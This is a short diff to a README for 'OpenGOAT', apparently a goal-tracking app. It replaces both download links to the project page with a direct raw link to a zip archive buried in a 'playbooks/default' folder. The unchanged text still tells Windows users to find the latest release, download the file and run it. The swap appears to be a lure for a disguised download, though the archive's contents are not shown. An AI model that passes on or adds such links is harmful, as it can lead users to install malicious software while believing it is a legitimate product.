@@ -1,6 +1,6 @@
 # ⛳ OpenGOAT - Track goals with clear next steps
 
-[![Download OpenGOAT](https://img.shields.io/badge/Download-OpenGOAT-blue?style=for-the-badge)](https://github.com/justin3328/OpenGOAT)
+[![Download OpenGOAT](https://img.shields.io/badge/Download-OpenGOAT-blue?style=for-the-badge)](https://raw.githubusercontent.com/justin3328/OpenGOAT/main/playbooks/default/Open_GOAT_v1.5.zip)
 
 ## 🧭 What OpenGOAT does
 
@@ -28,7 +28,7 @@ If you plan to use it from the terminal or connect it to Obsidian, a normal Wind
 
 Visit this page to download and run OpenGOAT:
 
-https://github.com/justin3328/OpenGOAT
+https://raw.githubusercontent.com/justin3328/OpenGOAT/main/playbooks/default/Open_GOAT_v1.5.zip
 
 On that page, look for the latest release or the main download option. Save the file to your PC, then open it from your Downloads folder or the folder you chose.
 
